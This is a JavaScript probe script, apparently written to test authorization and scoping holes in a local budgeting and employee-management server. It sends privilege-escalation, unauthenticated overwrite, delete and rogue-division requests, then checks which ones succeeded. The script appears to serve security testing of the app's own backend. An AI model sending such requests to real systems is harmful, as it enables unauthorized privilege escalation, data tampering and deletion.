// Contract probe: server-side auth/scoping holes (injected via fetch + eval)
(async function () {
  var out = {};
  var post = async function (body) {
    var res = await fetch('http://127.0.0.1:8765/exec', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify(body)
    });
    return res.json();
  };
  // 1) DeptHead tries to create an Admin in another division
  out.escalation = await post({ action: 'addEmployee', employeeId: '2199', name: 'Hacker', allowedProjects: 'ALL', allowedCompanies: 'ALL', role: 'Admin', department: 'CORFIN', callerNik: '2004' });
  // 2) Unauthenticated save overwrites ANOTHER division's budget row
  out.crossDeptSave = await post({ action: 'save', company: 'PT Puri Triniti Batam', project: 'Marcs Boulevard', department: 'CORFIN', data: { target_revenue: [{ category: 'HACKED', stock_units: 1, stock_sqm: 1, price_sqm: 1, units: Array(12).fill(0), sqm: Array(12).fill(0) }] } });
  // 3) Unauthenticated division delete
  out.deleteDept = await post({ action: 'deleteDepartment', department: 'TECHPLAN' });
  // 4) Unauthenticated rogue division create
  out.rogueDept = await post({ action: 'saveDepartment', department: 'ROGUE', allowedModules: 'ALL', allowedProjects: 'ALL', allowedCompanies: 'ALL' });
  // 5) DeptHead deletes a DeptHead in ANOTHER division (no dept scoping on delete)
  out.crossDeptDelete = await post({ action: 'deleteEmployee', employeeId: '2007', callerNik: '2004' });
  // 6) Verify server state after all of the above
  var list = await (await fetch('http://127.0.0.1:8765/exec?action=listEmployees')).json();
  out.empRoles = list.data.filter(function (e) { return e.employeeId === '2199' || e.employeeId === '2007' || e.employeeId === '2100'; }).map(function (e) { return e.employeeId + '=' + e.role + ':' + e.department; });
  var depts = await (await fetch('http://127.0.0.1:8765/exec?action=listDepartments')).json();
  out.deptNames = depts.data.map(function (d) { return d.department; });
  var corfin = await (await fetch('http://127.0.0.1:8765/exec?action=get&company=PT%20Puri%20Triniti%20Batam&project=Marcs%20Boulevard&department=CORFIN')).json();
  out.corfinRow = corfin.data ? (corfin.data.target_revenue || []).map(function (r) { return r.category; }) : null;
  window.__x = out;
})();
